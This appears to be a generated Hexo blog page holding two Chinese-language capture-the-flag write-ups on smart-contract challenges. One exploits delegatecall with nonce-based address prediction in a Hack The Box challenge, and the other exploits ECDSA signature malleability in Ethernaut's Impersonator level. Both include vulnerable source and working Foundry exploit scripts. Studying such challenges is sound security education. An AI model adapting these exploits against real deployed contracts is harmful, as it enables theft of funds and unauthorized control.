@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-blockchain_portal_noncense" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/03/24/blockchain_portal_noncense/" class="article-date">
+  <time class="dt-published" datetime="2026-03-24T02:49:52.000Z" itemprop="datePublished">2026-03-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/03/24/blockchain_portal_noncense/">portal_noncese</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="blockchain-portal-noncense"><a href="#blockchain-portal-noncense" class="headerlink" title="blockchain_portal_noncense"></a>blockchain_portal_noncense</h2><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>TARGET.isPortalActive(“orcKingdom”)</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul>
+<li>在合约<code>PortalStation</code>中，<code>destinations[&quot;orcKingdom&quot;] = 0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007;</code>存在于构造函数中，但没用被真正部署</li>
+<li>在函数<code>createPortal</code>中存在<code>delegetecall</code>，要求我们输入一个<code>_destination</code>并且返回值为<code>true</code>。我们知道，在合约A委托调用B合约时，执行B的逻辑，修改A的插槽。</li>
+<li>但是这里要求我们输入一个存在于<code>destinations</code>映射里的字符串</li>
+<li>我们可以通过Create计算出<code>orcKingdom</code>的地址，并将攻击合约插槽与原合约插槽对齐，并在函数<code>connect</code>内将<code>isPortalActive(&quot;orcKingdom&quot;)</code>设为true,返回值始终为true</li>
+</ul>
+<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>Setup.s.sol</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &#123;PortalStation&#125; from &quot;../src/Portal.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Setup &#123;</span><br><span class="line">    PortalStation public immutable TARGET;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        TARGET = new PortalStation();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        return TARGET.isPortalActive(&quot;orcKingdom&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Portal.sol</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract PortalStation &#123;</span><br><span class="line">    </span><br><span class="line">    mapping(string =&gt; address) public destinations;</span><br><span class="line">    mapping(string =&gt; bool) public isPortalActive;</span><br><span class="line">    bool isExpertStandby;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        destinations[&quot;orcKingdom&quot;] = 0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007;</span><br><span class="line">        destinations[&quot;elfKingdom&quot;] = 0x598136Fd1B89AeaA9D6825086B6E4cF9ad2BD4cF;</span><br><span class="line">        destinations[&quot;dawrfKingdom&quot;] = 0xFc2D16b59Ec482FaF3A8B1ee6E7E4E8D45Ec8bf1;</span><br><span class="line">        isPortalActive[&quot;elfKingdom&quot;] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function requestPortal(string calldata _destination) public payable &#123;</span><br><span class="line">        require(destinations[_destination] != address(0));</span><br><span class="line">        require(isExpertStandby, &quot;Portal expert has a day off&quot;);</span><br><span class="line">        require(msg.value &gt; 1337 ether);</span><br><span class="line"></span><br><span class="line">        isPortalActive[_destination] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function createPortal(string calldata _destination) public &#123;</span><br><span class="line">        require(destinations[_destination] != address(0));</span><br><span class="line">        </span><br><span class="line">        (bool success, bytes memory retValue) = destinations[_destination].delegatecall(abi.encodeWithSignature(&quot;connect()&quot;));</span><br><span class="line">        require(success, &quot;Portal destination is currently not available&quot;);</span><br><span class="line">        require(abi.decode(retValue, (bool)), &quot;Connection failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &#123;Script, console&#125; from &quot;forge-std/Script.sol&quot;;</span><br><span class="line"></span><br><span class="line">import &#123;PortalStation&#125; from &quot;../src/Portal.sol&quot;;</span><br><span class="line">import &#123;Setup&#125; from &quot;../src/Setup.sol&quot;;</span><br><span class="line">contract Dummy &#123;</span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack is Script &#123;</span><br><span class="line"></span><br><span class="line">    PortalStation portal = PortalStation(0xACef632826fb9d4EF70cB70640b5F56b7474B3a9);</span><br><span class="line">    Setup setup = Setup(0xfD730FDDbD5b98471b7a0fE78d2CB0Fd0E5454BA);</span><br><span class="line"></span><br><span class="line">    address constant TARGET = 0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007;</span><br><span class="line"></span><br><span class="line">    function run() external &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line"></span><br><span class="line">        address deployer = msg.sender;</span><br><span class="line">        uint256 startNonce = vm.getNonce(deployer);</span><br><span class="line"></span><br><span class="line">        uint256 targetNonce = type(uint256).max;</span><br><span class="line"></span><br><span class="line">        for (uint256 i = startNonce; i &lt; startNonce + 500; i++) &#123;</span><br><span class="line">            address predicted = vm.computeCreateAddress(deployer, i);</span><br><span class="line">            if (predicted == TARGET) &#123;</span><br><span class="line">                targetNonce = i;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        require(targetNonce != type(uint256).max, &quot;Target nonce not found&quot;);</span><br><span class="line"></span><br><span class="line">        while (vm.getNonce(deployer) &lt; targetNonce) &#123;</span><br><span class="line">            new Dummy();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Attack attack = new Attack();</span><br><span class="line">        require(address(attack) == TARGET, &quot;Deployment address mismatch&quot;);</span><br><span class="line"></span><br><span class="line">        IPortalStation(portal).createPortal(&quot;orcKingdom&quot;);</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    </span><br><span class="line">    mapping(string =&gt; address) public destinations;   // slot 0</span><br><span class="line">    mapping(string =&gt; bool) public isPortalActive;    // slot 1</span><br><span class="line">    bool public isExpertStandby;                       // slot 2</span><br><span class="line"></span><br><span class="line">    function connect() external returns (bool) &#123;</span><br><span class="line">        isPortalActive[&quot;orcKingdom&quot;] = true;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Create-计算地址"><a href="#Create-计算地址" class="headerlink" title="Create 计算地址"></a>Create 计算地址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// 被创建合约</span><br><span class="line">contract Callee &#123;</span><br><span class="line">  string value1;</span><br><span class="line">  string value2;</span><br><span class="line"></span><br><span class="line">  // 构造函数有两个参数</span><br><span class="line">  constructor(string memory _value1,string memory _value2) &#123;</span><br><span class="line">    value1 = _value1;</span><br><span class="line">    value2 = _value2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 合约创建者</span><br><span class="line">contract ContractCreator &#123;</span><br><span class="line">  // 新合约地址</span><br><span class="line">  address public contractAddress;</span><br><span class="line"></span><br><span class="line">  // 创建合约</span><br><span class="line">  function newContract(string memory value1,string memory value2) external &#123;</span><br><span class="line">    // 创建 Callee 合约实例，参数为 value1, value2</span><br><span class="line">    Callee callee = new Callee(value1, value2);</span><br><span class="line">    // 设置新建合约的地址</span><br><span class="line">    contractAddress = address(callee);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们知道，当<code>depolyer</code>和<code>nonce</code>值一样时，我们可以算出同样的地址</p>
+<p>在<code>Script</code>环境下，存在<code>vm.computeCreateAddress(deployer, nonce)</code>,可以预测合约地址。也就是说，如果我们设置一个循环，循环<code>nonce == i</code>，当返回的地址是我们所求的地址时，我们记录下当时的 i 值（<code>targetNonce</code>)。因为一个account初始的nonce是0，每次部署合约nonce +1。从0开始，设置一个循环,部署空合约，当<code>nonce == targetNonce</code>时停止，紧接着部署我们的攻击合约，此时攻击合约的地址即为所求地址</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/03/24/blockchain_portal_noncense/" data-id="cuidvNTtA7UZiVfrPVSSFa3kP" data-title="portal_noncese" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack-the-box/" rel="tag">hack_the_box</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Impersonator" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/03/24/Impersonator/" class="article-date">
+  <time class="dt-published" datetime="2026-03-24T02:49:52.000Z" itemprop="datePublished">2026-03-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/03/24/Impersonator/">Impersonator</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Impersonator"><a href="#Impersonator" class="headerlink" title="Impersonator"></a>Impersonator</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>证明任何人都可以打开门</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul>
+<li><p>源代码中有两个合约，合约Impersonator中的函数只有owner可以调用；ECLocker中有两个可以调用的函数</p>
+<ul>
+<li><code>changeController()</code>,当我们输入的<code>r, v, s</code>可以复原出初始<code>controller</code>的地址，<code>controller</code>就会被设为我们的输入的地址</li>
+<li><code>open()</code>:当我们输入的<code>r, v, s</code>可以复原出<code>controller</code>的地址，那么门就会打开</li>
+</ul>
+</li>
+<li><p>函数<code>_isValidSignature</code>中要求我们输入的<code>r, v, s</code>,不能还原出用过的签名，根据椭圆曲线算法的对称性，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r1   v1   s1</span><br><span class="line">r2 = r1</span><br><span class="line">v1 = 28(查到的是27)</span><br><span class="line">s2 = n -s1</span><br></pre></td></tr></table></figure>
+
+<p>其中secp256k1 的 n 固定为<code>FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</code></p>
+</li>
+<li><p>但是通过复原成功签名再打开门满足不了任何人都可以打开门的要求，但是如果我们输入的r v s 错误，还原的地址为0。我们可以先调用<code>changeController()</code>，将新的<code>controller</code>设为<code>address(0)</code>。这样，当调用<code>open()</code>时，我们可以输入任意数字，地址都会被还原为0，从而满足<code>address add = _isValidSignature(v, r, s);</code></p>
+</li>
+<li><p>在区块浏览器查询实例地址</p>
+<p><img src="C:\Users\34420\AppData\Roaming\Typora\typora-user-images\image-20251125175953190.png" alt="image-20251125175953190"></p>
+<p><img src="C:\Users\34420\AppData\Roaming\Typora\typora-user-images\image-20251125180117467.png" alt="image-20251125180117467"></p>
+<p>红色是真正的owner，黄色部分是找到的<code>r, v, s</code></p>
+</li>
+<li><p>最后，实例地址是合约<code>Impersonator</code>的地址，合约<code>ECLocker</code>的地址可以通过调用<code>ECLocker()</code>找到</p>
+</li>
+</ul>
+<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>contract.sol</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">//目标：任何人都可以打开门</span><br><span class="line">//0x4dBF353A22A5D7f28516deaF6A4aF8BAD81802c1</span><br><span class="line">pragma solidity ^0.8.28;</span><br><span class="line"></span><br><span class="line">import &quot;lib/openzeppelin-contracts/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">// SlockDotIt ECLocker factory</span><br><span class="line">contract Impersonator is Ownable &#123;</span><br><span class="line">    uint256 public lockCounter;</span><br><span class="line">    ECLocker[] public lockers;</span><br><span class="line"></span><br><span class="line">    event NewLock(address indexed lockAddress, uint256 lockId, uint256 timestamp, bytes signature);</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _lockCounter) Ownable(msg.sender)&#123;</span><br><span class="line">        lockCounter = _lockCounter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deployNewLock(bytes memory signature) public onlyOwner &#123;</span><br><span class="line">        // Deploy a new lock</span><br><span class="line">        ECLocker newLock = new ECLocker(++lockCounter, signature);</span><br><span class="line">        lockers.push(newLock);</span><br><span class="line">        emit NewLock(address(newLock), lockCounter, block.timestamp, signature);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ECLocker &#123;</span><br><span class="line">    uint256 public immutable lockId;</span><br><span class="line">    bytes32 public immutable msgHash;</span><br><span class="line">    address public controller;</span><br><span class="line">    mapping(bytes32 =&gt; bool) public usedSignatures;</span><br><span class="line"></span><br><span class="line">    event LockInitializated(address indexed initialController, uint256 timestamp);</span><br><span class="line">    event Open(address indexed opener, uint256 timestamp);</span><br><span class="line">    event ControllerChanged(address indexed newController, uint256 timestamp);</span><br><span class="line"></span><br><span class="line">    error InvalidController();</span><br><span class="line">    error SignatureAlreadyUsed();</span><br><span class="line"></span><br><span class="line">    /// @notice Initializes the contract the lock</span><br><span class="line">    /// @param _lockId uinique lock id set by SlockDotIt&#x27;s factory</span><br><span class="line">    /// @param _signature the signature of the initial controller</span><br><span class="line">    constructor(uint256 _lockId, bytes memory _signature) &#123;</span><br><span class="line">        // Set lockId</span><br><span class="line">        lockId = _lockId;</span><br><span class="line"></span><br><span class="line">        // Compute msgHash</span><br><span class="line">        bytes32 _msgHash;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(0x00, &quot;\x19Ethereum Signed Message:\n32&quot;) // 28 bytes</span><br><span class="line">            mstore(0x1C, _lockId) // 32 bytes</span><br><span class="line">            _msgHash := keccak256(0x00, 0x3c) //28 + 32 = 60 bytes</span><br><span class="line">        &#125;</span><br><span class="line">        msgHash = _msgHash;</span><br><span class="line"></span><br><span class="line">        // Recover the initial controller from the signature</span><br><span class="line">        address initialController = address(1);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            let ptr := mload(0x40)</span><br><span class="line">            mstore(ptr, _msgHash) // 32 bytes</span><br><span class="line">            mstore(add(ptr, 32), mload(add(_signature, 0x60))) // 32 byte v</span><br><span class="line">            mstore(add(ptr, 64), mload(add(_signature, 0x20))) // 32 bytes r</span><br><span class="line">            mstore(add(ptr, 96), mload(add(_signature, 0x40))) // 32 bytes s</span><br><span class="line">            pop(</span><br><span class="line">                staticcall(</span><br><span class="line">                    gas(), // Amount of gas left for the transaction.</span><br><span class="line">                    initialController, // Address of `ecrecover`.</span><br><span class="line">                    ptr, // Start of input.</span><br><span class="line">                    0x80, // Size of input.</span><br><span class="line">                    0x00, // Start of output.</span><br><span class="line">                    0x20 // Size of output.</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">            if iszero(returndatasize()) &#123;</span><br><span class="line">                mstore(0x00, 0x8baa579f) // `InvalidSignature()`.</span><br><span class="line">                revert(0x1c, 0x04)</span><br><span class="line">            &#125;</span><br><span class="line">            initialController := mload(0x00)</span><br><span class="line">            mstore(0x40, add(ptr, 128))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Invalidate signature</span><br><span class="line">        usedSignatures[keccak256(_signature)] = true;</span><br><span class="line"></span><br><span class="line">        // Set the controller</span><br><span class="line">        controller = initialController;</span><br><span class="line"></span><br><span class="line">        // emit LockInitializated</span><br><span class="line">        emit LockInitializated(initialController, block.timestamp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @notice Opens the lock</span><br><span class="line">    /// @dev Emits Open event</span><br><span class="line">    /// @param v the recovery id</span><br><span class="line">    /// @param r the r value of the signature</span><br><span class="line">    /// @param s the s value of the signature</span><br><span class="line">    function open(uint8 v, bytes32 r, bytes32 s) external &#123;</span><br><span class="line">        address add = _isValidSignature(v, r, s);</span><br><span class="line">        emit Open(add, block.timestamp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @notice Changes the controller of the lock</span><br><span class="line">    /// @dev Updates the controller storage variable</span><br><span class="line">    /// @dev Emits ControllerChanged event</span><br><span class="line">    /// @param v the recovery id</span><br><span class="line">    /// @param r the r value of the signature</span><br><span class="line">    /// @param s the s value of the signature</span><br><span class="line">    /// @param newController the new controller address</span><br><span class="line">    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external &#123;</span><br><span class="line">        _isValidSignature(v, r, s);</span><br><span class="line">        controller = newController;</span><br><span class="line">        emit ControllerChanged(newController, block.timestamp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _isValidSignature(uint8 v, bytes32 r, bytes32 s) internal returns (address) &#123;</span><br><span class="line">        address _address = ecrecover(msgHash, v, r, s);</span><br><span class="line">        require (_address == controller, InvalidController());</span><br><span class="line"></span><br><span class="line">        bytes32 signatureHash = keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]));</span><br><span class="line">        require (!usedSignatures[signatureHash], SignatureAlreadyUsed());</span><br><span class="line"></span><br><span class="line">        usedSignatures[signatureHash] = true;</span><br><span class="line"></span><br><span class="line">        return _address;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Hack.s.sol</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.28;</span><br><span class="line"></span><br><span class="line">import &#123;Script&#125; from &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &#123;ECLocker , Impersonator&#125; from &quot;../src/contract.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Hack is Script &#123;</span><br><span class="line"></span><br><span class="line">    uint256 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;</span><br><span class="line">    uint8 v2 = 28; </span><br><span class="line">    bytes32 r2 = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;</span><br><span class="line">    uint256 s2 = n - 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;</span><br><span class="line">    function run() external &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        Impersonator im = Impersonator(0x4dBF353A22A5D7f28516deaF6A4aF8BAD81802c1);</span><br><span class="line">        ECLocker ecl = im.lockers(0);</span><br><span class="line">        ecl.changeController(uint8(v2),bytes32(r2),bytes32(s2), address(0));</span><br><span class="line">        ecl.open(0, 0, 0);</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/03/24/Impersonator/" data-id="cuidCC968GdfGmT64FaI7vkf5" data-title="Impersonator" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Ethernaut/" rel="tag">Ethernaut</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/03/24/hello-world/" class="article-date">
+  <time class="dt-published" datetime="2026-03-24T02:47:18.460Z" itemprop="datePublished">2026-03-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/03/24/hello-world/">Hello World</a>
